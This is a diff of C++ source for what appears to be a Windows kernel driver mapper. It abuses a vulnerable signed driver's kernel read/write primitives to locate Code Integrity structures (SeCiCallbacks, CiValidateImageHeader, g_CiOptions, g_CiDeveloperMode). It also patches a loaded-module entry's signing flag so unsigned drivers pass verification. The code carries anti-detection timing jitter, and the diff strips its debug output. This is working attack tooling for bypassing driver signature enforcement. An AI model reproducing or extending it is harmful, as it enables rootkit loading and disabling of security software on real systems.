@@ -38,7 +38,7 @@ PVOID g_DriverLoadAddress = nullptr;
 WCHAR g_DonorCopyPath[520] = { 0 };
 WCHAR g_DonorSignerName[256] = { 0 };
 
-// Sentinel guardian support
+
 WCHAR g_SentinelServicePath[128] = { 0 };
 PVOID g_SentinelLoadAddress = nullptr;
 ULONG g_SentinelImageSize = 0;
@@ -79,28 +79,22 @@ namespace KernelUtils {
         PVOID buffer = nullptr;
 
         if (!NtQuerySystemInformationPtr) {
-            printf("[-] NtQuerySystemInformationPtr is NULL!\n");
             return nullptr;
         }
 
         status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
-        printf("[*] Initial NtQuerySystemInformation status: 0x%08lX, returnLength: %lu\n", status, returnLength);
-
         while (status == STATUS_INFO_LENGTH_MISMATCH) {
             if (buffer) {
                 VirtualFree(buffer, 0, MEM_RELEASE);
             }
             buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!buffer) {
-                printf("[-] VirtualAlloc failed for %lu bytes\n", returnLength);
                 return nullptr;
             }
             status = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
-            printf("[*] NtQuerySystemInformation retry status: 0x%08lX\n", status);
         }
 
         if (!NT_SUCCESS(status)) {
-            printf("[-] NtQuerySystemInformation failed with status: 0x%08lX\n", status);
             if (buffer) {
                 VirtualFree(buffer, 0, MEM_RELEASE);
             }
@@ -110,8 +104,6 @@ namespace KernelUtils {
         PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
         PVOID result = nullptr;
 
-        printf("[*] Found %lu kernel modules\n", moduleInfo->NumberOfModules);
-
         for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
             auto& mod = moduleInfo->Modules[i];
             auto currentName = reinterpret_cast<const char*>(
@@ -120,12 +112,10 @@ namespace KernelUtils {
 
 
             if (i < 5) {
-                printf("[*] Module[%lu]: %s @ %p\n", i, currentName, mod.ImageBase);
             }
 
             if (_stricmp(currentName, moduleName) == 0) {
                 result = mod.ImageBase;
-                printf("[+] Found %s @ %p\n", moduleName, result);
                 break;
             }
         }
@@ -134,24 +124,19 @@ namespace KernelUtils {
 
 
         if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
-            printf("[*] ImageBase is NULL, trying EnumDeviceDrivers fallback...\n");
             LPVOID drivers[1024];
             DWORD cbNeeded = 0;
             if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
 
                 if (cbNeeded >= sizeof(LPVOID) && drivers[0] != nullptr) {
                     result = drivers[0];
-                    printf("[+] EnumDeviceDrivers: ntoskrnl base @ %p\n", result);
                 } else {
-                    printf("[-] EnumDeviceDrivers returned empty or NULL\n");
                 }
             } else {
-                printf("[-] EnumDeviceDrivers failed: %lu\n", GetLastError());
             }
         }
 
         if (!result) {
-            printf("[-] Module '%s' not found\n", moduleName);
         }
 
         return result;
@@ -185,26 +170,19 @@ namespace KernelUtils {
         AntiDetect::TimingJitter();
 
         WindowsVersion winVer = GetWindowsVersion();
-        printf("[*] Windows Version: %lu.%lu.%lu (%s)\n",
-               winVer.major, winVer.minor, winVer.build,
-               winVer.isWindows11 ? "Windows 11" : "Windows 10");
-
         PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
         if (!ntoskrnlBase) {
-            printf("[-] Failed to get ntoskrnl base\n");
             return FALSE;
         }
 
         HMODULE localModule = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
         if (!localModule) {
-            printf("[-] Failed to load local ntoskrnl\n");
             return FALSE;
         }
 
         MODULEINFO modinfo = { 0 };
         if (!K32GetModuleInformation(GetCurrentProcess(), localModule, &modinfo, sizeof(modinfo))) {
             FreeLibrary(localModule);
-            printf("[-] Failed to get module info\n");
             return FALSE;
         }
 
@@ -268,7 +246,6 @@ namespace KernelUtils {
                                         foundAddr = leaAddr;
                                         leaInstructionOffset = pat.leaOffset;
                                         matchedPattern = pat.name;
-                                        printf("[+] Pattern matched: %s at offset 0x%lX\n", pat.name, offset);
                                         return true;
                                     }
                                 }
@@ -276,7 +253,6 @@ namespace KernelUtils {
                                 foundAddr = leaAddr;
                                 leaInstructionOffset = pat.leaOffset;
                                 matchedPattern = pat.name;
-                                printf("[+] Pattern matched: %s at offset 0x%lX\n", pat.name, offset);
                                 return true;
                             }
                         }
@@ -288,29 +264,22 @@ namespace KernelUtils {
 
         bool found = false;
         if (winVer.isWindows11) {
-            printf("[*] Trying Windows 11 patterns...\n");
             found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
             if (!found) {
-                printf("[*] Windows 11 patterns failed, trying Windows 10 patterns...\n");
                 found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
             }
         } else {
-            printf("[*] Trying Windows 10 patterns...\n");
             found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
             if (!found) {
-                printf("[*] Windows 10 patterns failed, trying Windows 11 patterns...\n");
                 found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
             }
         }
 
         if (!found) {
-            printf("[*] Trying universal fallback patterns...\n");
             found = searchPattern(universalPatterns, sizeof(universalPatterns) / sizeof(universalPatterns[0]));
         }
 
         if (!foundAddr) {
-            printf("[-] No CI callback pattern found\n");
-            printf("[-] This may require adding a new pattern for build %lu\n", winVer.build);
             FreeLibrary(localModule);
             return FALSE;
         }
@@ -321,11 +290,7 @@ namespace KernelUtils {
 
         ULONG_PTR kernelOffset = seCiCallbacksLocal - reinterpret_cast<ULONG_PTR>(localModule);
 
-        printf("[+] SeCiCallbacks offset from ntoskrnl base: 0x%llX\n", (unsigned long long)kernelOffset);
-
         if (kernelOffset >= modinfo.SizeOfImage) {
-            printf("[-] Invalid kernel offset (0x%llX >= 0x%lX)\n",
-                   (unsigned long long)kernelOffset, modinfo.SizeOfImage);
             FreeLibrary(localModule);
             return FALSE;
         }
@@ -336,7 +301,6 @@ namespace KernelUtils {
 
         PVOID zwFlushLocal = GetProcAddress(localModule, "ZwFlushInstructionCache");
         if (!zwFlushLocal) {
-            printf("[-] Failed to find ZwFlushInstructionCache\n");
             FreeLibrary(localModule);
             return FALSE;
         }
@@ -350,8 +314,6 @@ namespace KernelUtils {
         PVOID ciValidateImageHeaderEntry = reinterpret_cast<PVOID>(
             reinterpret_cast<ULONG_PTR>(seCiCallbacksKernel) + 0x20
         );
-
-        printf("[+] CiValidateImageHeader entry: %p\n", ciValidateImageHeaderEntry);
 
         FreeLibrary(localModule);
 
@@ -392,17 +354,13 @@ namespace KernelUtils {
         }
 
         if (!driverBase) {
-            printf("[-] Driver not found in loaded modules for signing patch\n");
             return FALSE;
         }
-        printf("[+] Target driver loaded at %p\n", driverBase);
-
         HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
         if (!localNtos) return FALSE;
         PVOID localPsLML = GetProcAddress(localNtos, "PsLoadedModuleList");
         if (!localPsLML) {
             FreeLibrary(localNtos);
-            printf("[-] PsLoadedModuleList not exported\n");
             return FALSE;
         }
         PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
@@ -417,7 +375,6 @@ namespace KernelUtils {
         ULONG_PTR listFlink = 0;
         NTSTATUS status = VulnDriver::ReadKernelMemory(device, pPsLoadedModuleList, &listFlink, sizeof(listFlink));
         if (!NT_SUCCESS(status) || !listFlink) {
-            printf("[-] Failed to read PsLoadedModuleList\n");
             return FALSE;
         }
 
@@ -432,12 +389,9 @@ namespace KernelUtils {
             if (entryDllBase == driverBase) {
                 DWORD flags = 0;
                 VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
-                printf("[*] Current module flags: 0x%08X\n", flags);
-
                 flags |= 0x20;
                 status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                 if (!NT_SUCCESS(status)) {
-                    printf("[-] Failed to write signing flags\n");
                     return FALSE;
                 }
 
@@ -449,11 +403,7 @@ namespace KernelUtils {
                 g_KernelSigningVerified = (verifyFlags & 0x20) != 0;
 
                 if (g_KernelSigningVerified) {
-                    printf("[+] Signing flags patched: 0x%08X\n", verifyFlags);
-                    printf("[+] IntegrityChecked bit (0x20): SET\n");
-                    printf("[+] MmVerifyCallbackFunction: WILL RETURN TRUE\n");
                 } else {
-                    printf("[-] Signing flags write succeeded but verification failed: 0x%08X\n", verifyFlags);
                 }
                 return TRUE;
             }
@@ -464,28 +414,22 @@ namespace KernelUtils {
             current = nextFlink;
         }
 
-        printf("[-] Driver entry not found in PsLoadedModuleList\n");
         return FALSE;
     }
 
     BOOL GetCiOptionsAddress(PVOID* outAddress) {
         PVOID ciBase = GetKernelModuleBase("CI.dll");
         if (!ciBase) {
-            printf("[-] Failed to get CI.dll kernel base\n");
             return FALSE;
         }
-        printf("[+] CI.dll kernel base: %p\n", ciBase);
-
         HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
         if (!localCi) {
-            printf("[-] Failed to load local CI.dll\n");
             return FALSE;
         }
 
         MODULEINFO modinfo = { 0 };
         if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
             FreeLibrary(localCi);
-            printf("[-] Failed to get CI.dll module info\n");
             return FALSE;
         }
 
@@ -522,14 +466,12 @@ namespace KernelUtils {
             ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
             if (localOffset < modinfo.SizeOfImage) {
                 optionsLocal = target;
-                printf("[+] g_CiOptions found at CI.dll+0x%llX\n", (unsigned long long)localOffset);
                 break;
             }
         }
 
         if (!optionsLocal) {
             FreeLibrary(localCi);
-            printf("[-] g_CiOptions pattern not found in CI.dll\n");
             return FALSE;
         }
 
@@ -537,20 +479,17 @@ namespace KernelUtils {
         FreeLibrary(localCi);
 
         *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
-        printf("[+] g_CiOptions kernel address: %p\n", *outAddress);
         return TRUE;
     }
 
     BOOL GetCiDeveloperModeAddress(PVOID* outAddress) {
         PVOID ciBase = GetKernelModuleBase("CI.dll");
         if (!ciBase) {
-            printf("[-] Failed to get CI.dll kernel base\n");
             return FALSE;
         }
 
         HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
         if (!localCi) {
-            printf("[-] Failed to load local CI.dll\n");
             return FALSE;
         }
 
@@ -584,7 +523,6 @@ namespace KernelUtils {
                 ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
                 if (localOffset < modinfo.SizeOfImage) {
                     devModeLocal = target;
-                    printf("[+] g_CiDeveloperMode found at CI.dll+0x%llX\n", (unsigned long long)localOffset);
                     break;
                 }
             }
@@ -592,7 +530,6 @@ namespace KernelUtils {
 
         if (!devModeLocal) {
             FreeLibrary(localCi);
-            printf("[-] g_CiDeveloperMode pattern not found in CI.dll\n");
             return FALSE;
         }
 
@@ -600,95 +537,66 @@ namespace KernelUtils {
         FreeLibrary(localCi);
 
         *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
-        printf("[+] g_CiDeveloperMode kernel address: %p\n", *outAddress);
         return TRUE;
     }
 
     PVOID GetDriverBaseByName(PCWSTR driverFileName, PULONG outImageSize) {
-        // Use NtQuerySystemInformation(SystemModuleInformation = 11) to enumerate
-        // all loaded kernel modules, then match by filename suffix.
-        // This is the same approach used throughout the mapper for finding kernel module bases.
 
-        ULONG needed = 0;
-        NTSTATUS status = NtQuerySystemInformation(
-            static_cast<SYSTEM_INFORMATION_CLASS>(11), // SystemModuleInformation
-            nullptr, 0, &needed);
 
-        if (needed == 0) {
-            printf("[-] GetDriverBaseByName: NtQuerySystemInformation sizing failed\n");
+        if (!NtQuerySystemInformationPtr) {
             return nullptr;
         }
 
-        // Allocate with extra margin — module list can grow between calls
-        ULONG bufSize = needed + 4096;
-        auto buf = std::make_unique<BYTE[]>(bufSize);
+        ULONG returnLength = 0;
+        NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
+        if (returnLength == 0) {
+            return nullptr;
+        }
 
-        status = NtQuerySystemInformation(
-            static_cast<SYSTEM_INFORMATION_CLASS>(11),
-            buf.get(), bufSize, &needed);
 
+        ULONG bufSize = returnLength + 4096;
+        PVOID buffer = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!buffer) {
+            return nullptr;
+        }
+
+        status = NtQuerySystemInformationPtr(11, buffer, bufSize, &returnLength);
         if (!NT_SUCCESS(status)) {
-            printf("[-] GetDriverBaseByName: NtQuerySystemInformation failed 0x%08X\n", status);
+            VirtualFree(buffer, 0, MEM_RELEASE);
             return nullptr;
         }
 
-        // RTL_PROCESS_MODULES layout:
-        //   ULONG NumberOfModules
-        //   RTL_PROCESS_MODULE_INFORMATION Modules[1]
-        // RTL_PROCESS_MODULE_INFORMATION layout:
-        //   HANDLE Section            (+0x00)
-        //   PVOID  MappedBase         (+0x08)
-        //   PVOID  ImageBase          (+0x10)
-        //   ULONG  ImageSize          (+0x18)
-        //   ULONG  Flags              (+0x1C)
-        //   USHORT LoadOrderIndex     (+0x20)
-        //   USHORT InitOrderIndex     (+0x22)
-        //   USHORT LoadCount          (+0x24)
-        //   USHORT OffsetToFileName   (+0x26)
-        //   UCHAR  FullPathName[256]  (+0x28)
 
-        ULONG moduleCount = *reinterpret_cast<ULONG*>(buf.get());
-        BYTE* entry = buf.get() + sizeof(ULONG);
-        constexpr SIZE_T ENTRY_SIZE = 0x128; // sizeof(RTL_PROCESS_MODULE_INFORMATION) on x64
+        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
+        PVOID result = nullptr;
+        ULONG resultSize = 0;
 
-        // Convert wide target filename to narrow for comparison
         char targetNarrow[260] = {};
-        {
-            int i = 0;
-            for (; driverFileName[i] && i < 259; i++)
-                targetNarrow[i] = static_cast<char>(driverFileName[i]);
-            targetNarrow[i] = '\0';
-        }
+        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, targetNarrow, sizeof(targetNarrow), NULL, NULL);
 
-        // Case-insensitive narrow string compare
-        auto stricmpA = [](const char* a, const char* b) -> int {
-            while (*a && *b) {
-                char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
-                char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
-                if (ca != cb) return ca - cb;
-                a++; b++;
-            }
-            return static_cast<unsigned char>(*a) - static_cast<unsigned char>(*b);
-        };
+        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
+            auto& mod = moduleInfo->Modules[i];
+            const char* fileName = reinterpret_cast<const char*>(
+                mod.FullPathName + mod.OffsetToFileName);
 
-        for (ULONG i = 0; i < moduleCount; i++) {
-            PVOID imageBase = *reinterpret_cast<PVOID*>(entry + 0x10);
-            ULONG imageSize = *reinterpret_cast<ULONG*>(entry + 0x18);
-            USHORT nameOffset = *reinterpret_cast<USHORT*>(entry + 0x26);
-            const char* fullPath = reinterpret_cast<const char*>(entry + 0x28);
-            const char* fileName = fullPath + nameOffset;
-
-            if (stricmpA(fileName, targetNarrow) == 0) {
-                printf("[+] Found %s at %p (size 0x%X)\n", fileName, imageBase, imageSize);
-                if (outImageSize)
-                    *outImageSize = imageSize;
-                return imageBase;
+            if (i == 0) {
             }
 
-            entry += ENTRY_SIZE;
+            if (_stricmp(fileName, targetNarrow) == 0) {
+                result = mod.ImageBase;
+                resultSize = mod.ImageSize;
+                break;
+            }
         }
 
-        printf("[-] GetDriverBaseByName: '%s' not found in loaded modules\n", targetNarrow);
+        VirtualFree(buffer, 0, MEM_RELEASE);
+
+        if (result) {
+            if (outImageSize)
+                *outImageSize = resultSize;
+            return result;
+        }
+
         return nullptr;
     }
 
